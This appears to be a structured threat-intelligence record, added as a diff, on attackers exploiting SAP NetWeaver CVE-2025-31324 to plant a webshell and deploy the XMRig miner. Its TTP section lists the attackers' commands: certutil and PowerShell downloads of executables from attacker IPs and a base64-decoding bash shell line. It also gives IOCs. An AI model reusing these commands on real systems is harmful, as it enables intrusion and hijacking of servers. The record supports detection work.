@@ -1,0 +1,59 @@
+summary: A vulnerability in SAP NetWeaver (CVE-2025-31324) was exploited to upload
+  a webshell, which was then used to deploy the XMRig coin miner and conduct reconnaissance
+  activities.  Multiple threat actors leveraged the initial compromise for various
+  purposes.
+date: '2025-04-30'
+authors:
+- Rob Anderson
+attribution: ReliaQuest, multiple threat actors
+malware_families:
+- XMRig
+TTPs:
+  processs:
+  - cmd.exe
+  - certutil.exe
+  - jstart.EXE
+  - bash
+  - powershell.exe
+  commandline:
+  - cmd /c certutil -urlcache -split -f hxxp://23.95.123[.]5:666/xmrigCCall/1110.exe
+    C:\\Users\\Public\\1110.exe
+  - D:\\usr\\sap\\POP\\J00\\exe\\jstart.EXE -appTrc -nodeId=2 pf=\\\\SYSTEM01\\sapmnt\\POP\\SYS\\profile\\POP_J00_SYSTEM01
+    -DSAPINFO=POP_00_server0 -hostvm -nodeName=ID555550 -file=D:\\usr\\sap\\POP\\J00\\j2ee\\cluster\\instance.properties
+    -jvmFile=D:\\usr\\sap\\POP\\J00\\work\\jstart.jvm -traceFile=D:\\usr\\sap\\POP\\J00\\work\\dev_server0
+    -javaOutFile=D:\\usr\\sap\\POP\\J00\\work
+  - cmd /c certutil -urlcache -split -f hxxp://23.95.123[.]5:666/xmrigCCall/s.exe
+    C:\\Users\\Public\\s.exe
+  - bash -c {echo,....=}{base64,-d}{bash,-i}
+  - powershell Invoke-WebRequest -Uri "hxxp://65.49.235[.]210/download/2.jpg" -OutFile
+    "cmake.exe"
+  powershell:
+  - Invoke-WebRequest -Uri "hxxp://65.49.235[.]210/download/2.jpg" -OutFile "cmake.exe"
+  registry_keys: {}
+  network_connections:
+  - port: 666
+    destination: 23.95.123[.]5
+  - destination: 65.49.235[.]210
+  file_modifications:
+  - path: C:\\Users\\Public\\1110.exe
+  - path: C:\\Users\\Public\\s.exe
+  - path: D:\\usr\\sap\\POP\\J00\\j2ee\\cluster\\apps\\sap.com\\irj\\servlet_jsp\\irj\\root\\helper.jsp
+  persistence: {}
+  pipes: {}
+  process_relations:
+  - parent: D:\\usr\\sap\\POP\\J00\\exe\\jstart.EXE
+    child: certutil.exe
+IOCs:
+  hashes:
+  - 272b2fc48f6cbbf105cbe961b163de99e761b31d
+  - 925f6bc2a3fb5bb15a434f5f42196d49f36459e3
+  ips:
+  - 23.95.123[.]5
+  - 65.49.235[.]210
+  domains: {}
+  urls:
+  - hxxp://23.95.123[.]5:666/xmrigCCall/1110.exe
+  - hxxp://23.95.123[.]5:666/xmrigCCall/s.exe
+  - hxxps://65.49.235[.]210/_api/web
+reference: https://labs.withsecure.com/publications/netweaver-cve-2025-31324.html
+file_creation_date: May 09, 2025
